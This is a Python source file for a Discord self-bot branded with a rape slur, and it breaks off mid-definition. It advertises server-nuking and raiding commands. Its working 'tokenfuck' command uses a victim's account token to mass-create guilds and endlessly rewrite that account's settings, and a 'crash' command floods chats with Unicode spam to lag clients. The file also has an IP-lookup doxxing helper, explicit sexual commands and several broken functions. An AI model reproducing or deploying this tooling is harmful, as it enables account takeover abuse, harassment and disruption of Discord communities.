import discord
from discord.ext import commands
from colorama import Fore
import json
import psutil
import asyncio
from datetime import * 
import time 
import os
import sys
import requests
import random
from pypresence import Presence
import psutil 
import ctypes
from discord.ext import commands
import sys
from itertools import cycle
import webbrowser



def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

class rape:
    def setup():
        if not os.path.exists('./config.json'):
            clear()
            with open('./config.json', 'w') as fp:
                print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}-{Fore.LIGHTWHITE_EX}] {Fore.LIGHTRED_EX}Welcome to the setup.")
                setup_token = input(Fore.LIGHTWHITE_EX +'>' + Fore.LIGHTRED_EX + ' Enter token: ' + Fore.LIGHTWHITE_EX)
                setup_data = {
                    "token": setup_token,
                    "prefix": ">",
                    "color": "0x6495ed",
                    "del_after": 10,
                    "footer": "rape v1",
                    "presense": "True"
                }
                json.dump(setup_data, fp, indent=4)
                time.sleep(3)
            clear()
            Fore.RESET
        else:
            pass

if not os.path.exists('./config.json'):
    rape.setup()

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
prefix = config.get('prefix')
color = config.get('color')
del_after = config.get('del_after')
footer = config.get('footer')
rich_presence = config.get('presense')

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    w = f'{Fore.WHITE}'
    print(f'''{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}   *  .  . *       *    .        .        .   *    ..  *    *            .      *   *         *   *    .  *      .        .  *   .'''+Fore.RESET)
    print()
    print(Fore.MAGENTA + f' ██████   █████  ██████  ███████ '.center(os.get_terminal_size().columns))
    print(Fore.MAGENTA + f' ██   ██ ██   ██ ██   ██ ██      '.center(os.get_terminal_size().columns))
    print(Fore.MAGENTA + f' ██████  ███████ ██████  █████   '.center(os.get_terminal_size().columns))
    print(Fore.MAGENTA + f' ██   ██ ██   ██ ██      ██      '.center(os.get_terminal_size().columns))
    print(Fore.MAGENTA + f' ██   ██ ██   ██ ██      ███████  '.center(os.get_terminal_size().columns))
    print(Fore.MAGENTA)
    print(Fore.MAGENTA)
    print(Fore.BLUE + f' credit: https://github.com/moronnnn '.center(os.get_terminal_size().columns))
    print(Fore.BLUE + f' originally developed by: https://github.com/i3gaps '.center(os.get_terminal_size().columns))
    for i in range(os.get_terminal_size().columns):
        print(Fore.LIGHTWHITE_EX + '─', end='')
    
    print('\n')

@bot.event
async def on_command(ctx):
    dt = datetime.utcfromtimestamp(time.time())
    current_time = dt.strftime("%H:%M")
    print(f'{Fore.LIGHTWHITE_EX}[{Fore.CYAN}{current_time}{Fore.LIGHTWHITE_EX}] {Fore.CYAN}command used {Fore.LIGHTWHITE_EX}| {Fore.CYAN}{ctx.command.name}')

@bot.event
async def on_connect():
    bot.loop.create_task(title())
    banner()


snipe_message_author = {}
snipe_message_content = {}
@bot.event
async def on_message_delete(message):
     snipe_message_author[message.channel.id] = message.author
     snipe_message_content[message.channel.id] = message.content
     await asyncio.sleep(1000000000000000)
     del snipe_message_author[message.channel.id]
     del snipe_message_content[message.channel.id]
    

async def title():
    while True:
        cpuavg = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()[2]  
        ctypes.windll.kernel32.SetConsoleTitleW(f'[Rape V1] connected to {bot.user.name} | MOTD: discord.gg/raid | CPU @ {cpuavg}% | Memory @ {mem}%')
        await asyncio.sleep(3)

@bot.command(aliases=["cls"])
async def clear(ctx):
    await ctx.message.delete()
    os.system("cls")
    banner()

@bot.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url='https://www.twitch.tv/r4p3',
    )
    await bot.change_presence(activity=stream)

@bot.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await bot.change_presence(activity=game)


@bot.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))


@bot.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.message.delete()
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))

@bot.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f'{Fore.LIGHTWHITE_EX}[{Fore.BLUE}error{Fore.LIGHTWHITE_EX}] {Fore.BLUE} seems you can\'t run this command due to missing permissions')
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f'{Fore.LIGHTWHITE_EX}[{Fore.BLUE}error{Fore.LIGHTWHITE_EX}] {Fore.BLUE} missing argument(s){Fore.WHITE}: {Fore.BLUE}{error}')
    elif isinstance(error, discord.errors.Forbidden):
        print(f'{Fore.LIGHTWHITE_EX}[{Fore.BLUE}error{Fore.LIGHTWHITE_EX}] {Fore.BLUE} not allowed{Fore.WHITE}: {Fore.BLUE}{error}')
    else:
        return

@bot.command()
async def help(ctx, help):
    await ctx.message.delete()
    try:
        embed= discord.Embed(color= 0x34495E, title= "Commands",timestamp=datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url="https://i.imgur.com/t6NHYp5.jpeg")
        embed.set_footer(text=" RapeV1")
        embed.add_field(name=">catkiss", value= "best command on the selfbot", inline=False)
        embed.add_field(name=">messages", value= "message commands", inline=False)
        embed.add_field(name=">malicious", value="malicious/nuking commands", inline=False)
        embed.add_field(name=">networking", value="network commands", inline=False)
        embed.add_field(name=">Fun", value="fun commands", inline=False)
        embed.add_field(name=">NSFW", value=" :wink: :wink: ", inline=False)
        embed.add_field(name=">selfbot", value="selfbot client commands", inline=False)
        embed.add_field(name=">Moderation", value="mod commands", inline=False)
        embed.add_field(name=">selfbotinfo", value="selfbot info", inline=False)
        await ctx.send(embed=embed)
    except:
        await ctx.send("Error: this command does not have embed permissions check the console for the list")
        os.system("cls")
        print("""
        Help commands in the console for you aswell
        Information:
        Fun:
        - kiss
        - hug
        - dafloppa
        - btc
        - mommy
        - leet
        -dankmemerfarm (still in progress)
        Moderation:
        - ban
        - kick
        - unban
        - nuke
        selfbot:
        - clear
        - restart
        """)
        input()

@bot.command()
async def fun(ctx):
    await ctx.message.delete()
    embed= discord.Embed(color= 0x34495E, title= "Fun commands",timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/ZFjdBwP.jpg")
    embed.add_field(name="kiss", value="will send a kiss gif", inline=False)
    embed.add_field(name=">hug", value="will send a hug gif", inline=False)
    embed.add_field(name=">dafloppa", value="dafloppa.", inline=False)
    embed.add_field(name=">mommy", value="Mommy? Sorry.", inline=False)
    embed.add_field(name=">leet", value="will send message in 1337 (leet)", inline=False)
    embed.add_field(name=">dankmemerfarm", value="***BEING WORKED ON***", inline=False)
    embed.set_footer(text=" RapeV1")
    await ctx.send(embed=embed)

@bot.command()
async def messages(ctx):
    await ctx.message.delete()
    embed= discord.Embed(color= 0x34495E, title= "message commands",timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/MC8TwBt.jpg")
    embed.add_field(name=">purge", value="will purge a specified number of messages", inline=False)
    embed.add_field(name=">deleteall", value="will delete every single message youve sent in the DM/guild", inline=False)
    embed.add_field(name=">av", value="will send the specificed users avatar", inline=False)
    embed.add_field(name=">purgehack", value="will send a massive blank space clearing the chat", inline=False)
    embed.add_field(name=">spam", value="will send a certain message with a specific value multiple times", inline=False)
    embed.add_field(name=">snipe", value="will send the most recent deleted message in chat", inline=False)
    embed.set_footer(text=" RapeV1")
    await ctx.send(embed=embed)

@bot.command()
async def malicious(ctx):
    await ctx.message.delete()
    embed= discord.Embed(color= 0x34495E, title= "malicious commands",timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/RglevHF.jpg")
    embed.add_field(name = "IMPORTANT!!!", value= "***PLEASE KEEP NOTE THAT THESE COMMANDS ARE USED TO NUKE SERVERS WHICH COULD EASILY RESULT AN ACCOUNT TERMINATION IF USED BLATENLY, USE AT YOUR OWN RISK***", inline=False)
    embed.add_field(name=">webhookinfo", value="will show info on the specified webhook", inline=False)
    embed.add_field(name=">delhook", value="will delete the specified webhook", inline=False)
    embed.add_field(name=">sendhook", value="will send a message from the specified webhook", inline=False)
    embed.add_field(name=">rape", value="deletes all channels, changes server name and bans as many users in the guild as possible", inline=False)
    embed.add_field(name=">masschannel", value="will make 250 channels named ***raped*** (can be changed in the code)", inline=False)
    embed.add_field(name=">massrole", value="will make 100 roles named ***nuked by xraq*** (can be changed in the code)", inline=False)
    embed.add_field(name=">tokenfuck", value="will absolutely shti on someones account via token (fill servers change status unadd friends cycle themes etc etc)", inline=False)
    embed.add_field(name=">crash", value="will send a fuck ton of emojis/symbols to lag someones discord/possibly crash it if enough was sent", inline=False)
    embed.add_field(name=">masskick", value="will kick all the users in the guild", inline=False)
    embed.add_field(name=">banall", value="will ban all the users in the guild", inline=False)
    embed.set_footer(text=" RapeV1")
    await ctx.send(embed=embed)

@bot.command()
async def networking(ctx):
    await ctx.message.delete()
    embed= discord.Embed(color= 0x34495E, title= "networking commands",timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/b3Vv2nq.jpg")
    embed.add_field(name=">ping", value="pings specific IP via ICMP", inline=False)
    embed.add_field(name=">iplookup", value="will look up an IPs city, region, country, coords, postal, timezone and organization", inline=False)
    embed.set_footer(text=" RapeV1")
    await ctx.send(embed=embed)

@bot.command()
async def nsfw(ctx):
    await ctx.message.delete()
    embed= discord.Embed(color= 0x34495E, title= "NSFW commands",timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/EWzyaDp.jpg")
    embed.add_field(name=">lesbian", value="will send lesbian hentai (also very hot)", inline=False)
    embed.add_field(name=">hentai", value="will send a hentai gif (very hot)", inline=False)
    embed.add_field(name=">anal", value="sends gif of anal hentai (hot) ", inline=False)
    embed.add_field(name=">boobs", value="sends gif of hentai titties (hot) ", inline=False)
    embed.add_field(name=">blowjob", value="personal favorite. ", inline=False)
    embed.add_field(name=">pussy", value="sends pussy hentai gif ", inline=False)
    embed.set_footer(text=" RapeV1")
    await ctx.send(embed=embed)

@bot.command()
async def selfbot(ctx):
    await ctx.message.delete()
    embed= discord.Embed(color= 0x34495E, title= "selfbot client commands",timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/oLsIaYD.jpg")
    embed.add_field(name=">logout", value="will log you out of the selfbot causing it to close itself", inline=False)
    embed.add_field(name=">restart", value="will restart the selfbot (close it and open it)", inline=False)
    embed.add_field(name=">clear", value="will clear the selfbot console", inline=False)
    embed.set_footer(text=" RapeV1")
    await ctx.send(embed=embed)

@bot.command()
async def moderation(ctx):
    await ctx.message.delete()
    embed= discord.Embed(color= 0x34495E, title= "mod commands",timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/QRY7O2l.jpg")
    embed.add_field(name=">ban", value="bans a user from the guild ***MUST HAVE BAN PERMISSIONS***", inline=False)
    embed.add_field(name=">kick", value="kicks a user from the guild ***MUST HAVE KICK PERMISSIONS***", inline=False)
    embed.add_field(name=">unban", value="unbans a user from the guild ***MUST HAVE UNBAN PERMISSIONS***", inline=False)
    embed.add_field(name=">nuke", value="nukes the channel (deletes it and reputs it back where it was) ***MUST HAVE MANAGE SERVER PERMISSIONS***", inline=False)
    embed.add_field(name=">antinuke", value="refrains the server from getting raided/nuked", inline=False)
    embed.set_footer(text=" RapeV1")
    await ctx.send(embed=embed)

@bot.command()
async def githubb(ctx):
    await ctx.message.delete()
    embed= discord.Embed(color= 0x34495E, title= "github",timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/QRY7O2l.jpg")
    embed.add_field(name="github", value="will open my github via browser", inline=False)
    embed.set_footer(text=" RapeV1")
    await ctx.send(embed=embed)

@bot.command()
async def selfbotinfo(ctx):
    await ctx.message.delete()
    embed= discord.Embed(color= 0x34495E, title= "selfbot info",timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/QRY7O2l.jpg")
    embed.add_field(name="info", value="will give u base information on the selfbot", inline=False)
    embed.set_footer(text=" RapeV1")
    await ctx.send(embed=embed)


    

@bot.command()
async def hookinfo(ctx, webhook):
    await ctx.message.delete()
    r = requests.get(webhook).json()
    embed = discord.Embed(title='webhook info', description=f'name: {r["name"]}\navatar: {r["avatar"]}\nID: {r["id"]}\nchannel id: {r["channel_id"]}\nguild id: {r["guild_id"]}\ntoken: {r["token"]}', color=0x6495ED)
    await ctx.send(embed=embed, delete_after=del_after)

@bot.command()
async def info(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Selfbot Information**", color=0x6495ED, timestamp=datetime.utcfromtimestamp(time.time()))
    embed.set_thumbnail(url="https://i.imgur.com/JiF6DNA.jpg")
    embed.add_field(name="**made in**", value="python (discord.py) ", inline=False)
    embed.add_field(name="**made by**", value=".??#0001 (Xraq) github: https://github.com/moronnnn",inline=False)
    embed.add_field(name="**originated by**", value="https://github.com/i3gap",inline=False)
    embed.set_footer(text="RapeV1")
    await ctx.send(embed=embed)

@bot.command()
async def kiss(ctx): 
    await ctx.message.delete()
    r = requests.get("https://neko-love.xyz/api/v1/kiss")
    
    em = discord.Embed()
    em.set_image(url=r['url'])
    await ctx.send(embed=em)

@bot.command()
async def hug(ctx): 
    await ctx.message.delete()
    r = requests.get("https://neko-love.xyz/api/v1/hug")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command(aliases=['exit'])
async def logout(ctx):
    await ctx.message.delete()
    await ctx.send("logging out..", delete_after=0.2)
    await asyncio.sleep(2)
    exit(0)

@bot.command(usage="mommy", description="mommy? sorry.")
async def mommy(rape, amount: int):
    await rape.message.delete()
    mommy = await rape.send('Mommy?')
    for x in range(amount):
      await asyncio.sleep(1)
      await mommy.edit(content='Sorry.')
      await asyncio.sleep(1)
      await mommy.edit(content='Mommy?')

@bot.command(aliases=['discfuck'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': True,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible",
        'custom_status': "token fucked by Xraq"
    }
    guild = {
        'channels': None,
        'icon': "https://i.imgur.com/QHq1tiY.png",
        'name': "NUKED",
        'region': "europe"
    }
    for _i in range(100):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break

@bot.command(aliases=['avatar '])
async def av(ctx, *, member: discord.Member = None):
    await ctx.message.delete()
    embed = discord.Embed(title=f"{member}'s avatar",color= 0x6495ED)
    avatarurl = member.avatar_url
    embed.set_image(url=avatarurl)
    await ctx.send(embed=embed)

@bot.command()
async def iplookup(ctx, ip: str=None):
    await ctx.message.delete()
    if ip is None: await ctx.send("Please specify an IP address");return
    else:
        try:
            with requests.session() as ses:
                resp = ses.get(f'https://ipinfo.io/{ip}/json')
                if "Wrong ip" in resp.text:
                    await ctx.send("Invalid IP address")
                    return
                else:
                    try:
                        j = resp.json()
                        embed= discord.Embed(color= 0x34495E, title=f"INFO",timestamp=datetime.utcfromtimestamp(time.time()))
                        embed.set_thumbnail(url="https://i.imgur.com/XZz9ZPo.jpg")
                        embed.add_field(name=f'IP', value=f'{ip}', inline=False)
                        embed.add_field(name=f'City', value=f'{j["city"]}', inline=False)
                        embed.add_field(name=f'Region', value=f'{j["region"]}', inline=False)
                        embed.add_field(name=f'Country', value=f'{j["country"]}', inline=False)
                        embed.add_field(name=f'Coordinates', value=f'{j["loc"]}', inline=False)
                        embed.add_field(name=f'Postal', value=f'{j["postal"]}', inline=False)
                        embed.add_field(name=f'Timezone', value=f'{j["timezone"]}', inline=False)
                        embed.add_field(name=f'Organization', value=f'{j["org"]}', inline=False)
                        embed.set_footer(text="RapeV1")
                        await ctx.send(embed=embed)
                    except discord.HTTPException:
                        await ctx.send(f'**{ip} Info**\n\nCity: {j["city"]}\nRegion: {j["region"]}\nCountry: {j["country"]}\nCoordinates: {j["loc"]}\nPostal: {j["postal"]}\nTimezone: {j["timezone"]}\nOrganization: {j["org"]}')
        except Exception as e:
            await ctx.send(f"Error: {e}")
            # skidripped this because it looked better than the one i was using lmao

@bot.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command(usage='dafloppa', description='Sends cool DaFloppa')
async def dafloppa(rape):
    await rape.message.delete()
    message = await rape.send('''fuck bitches get floppa''')
    await rape.send('https://pbs.twimg.com/media/Epe8jZ2WwAMSk2b.jpg')

@bot.command()
async def leet(ctx, *, message: str=None):
    await ctx.message.delete()
    
    if message is None:
        await ctx.send("insert leet message")
    else:
        try:
            word = message
            leetmsg = word
            leetwords = "aeioutsyou"
            for letter in word:
                if letter in leetwords:
                    leetmsg = leetmsg.replace('a', str(4))
                    leetmsg = leetmsg.replace('e', str(3))
                    leetmsg = leetmsg.replace('i', str(1))
                    leetmsg = leetmsg.replace('o', str(0))
                    leetmsg = leetmsg.replace('t', str(7))
                    leetmsg = leetmsg.replace('s', '2')
                    leetmsg = leetmsg.replace('you', 'j00')

            embed= discord.Embed(color= 0x6495ED, title="Leet", description=f"{leetmsg.upper()}",timestamp=datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url="https://i.imgur.com/TR2cv3C.jpg")
            embed.set_footer(text=" RapeV1")
            await ctx.send(embed=embed)
        except discord.HTTPException:
            word = message
            leetmsg = word
            leetwords = "aeioutsyou"
            for letter in word:
                if letter in leetwords:
                    leetmsg = leetmsg.replace('a', str(4))
                    leetmsg = leetmsg.replace('e', str(3))
                    leetmsg = leetmsg.replace('i', str(1))
                    leetmsg = leetmsg.replace('o', str(0))
                    leetmsg = leetmsg.replace('t', str(7))
                    leetmsg = leetmsg.replace('s', '$')
                    leetmsg = leetmsg.replace('you', 'j00')
            await ctx.send(f"{leetmsg.upper()}")

@bot.command()
async def hentai(ctx): 
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    embed = discord.Embed()
    embed.set_image(url=res['url'])
    await ctx.send(embed=embed)

@bot.command()
async def crash(ctx):
    await ctx.message.delete()
    for i in range(25):
        await ctx.send(':grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face: ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽:grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses:')
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        await ctx.send(':grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face: ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽:grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses:')
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        await ctx.send(':grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face: ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽:grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses:')
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, user: discord.Member=None, *, reason: str=None):
    if user is None:
        await ctx.send("who would you like to ban?")
        return
    elif user == ctx.author:
        await ctx.send("cant ban yourself bro :sob: ")
        return
    else:pass
    try:
        await user.ban(reason=reason)
        await ctx.send(f"User {user.mention}({user.id}) has been banned for reason: {reason}")
    except Exception as e:
        await ctx.send(f"{e}")
@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.CheckFailure):

         await ctx.send(f"Error: {error}")

@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, user: discord.Member=None, *, reason: str=None):
    if user is None:
        await ctx.send("who would you like to kick?")
        return
    elif user == ctx.author:
        await ctx.send("cant kick yourself bro :sob: ")
        return
    else:pass
    try:
        await user.ban(reason=reason)
        await ctx.send(f"User {user.mention}({user.id}) has been kicked for reason: {reason}")
    except Exception as e:
        await ctx.send(f"{e}")
@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        
        await ctx.send(f"Error: {error}")

@bot.command(aliases=["vagina"])
